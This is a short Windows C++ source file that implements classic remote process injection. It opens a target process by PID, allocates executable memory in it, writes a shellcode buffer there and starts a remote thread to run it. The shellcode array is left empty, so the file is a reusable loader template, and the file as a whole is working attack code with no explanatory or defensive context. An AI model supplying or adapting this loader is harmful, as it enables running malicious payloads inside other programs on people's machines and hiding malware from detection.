#include <windows.h>
#include <iostream.h>

//argv[1] == PID to inject

int main(int argc, char* argv[])
{
    unsigned char shellcode[] = "";

    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);

    return 0;
}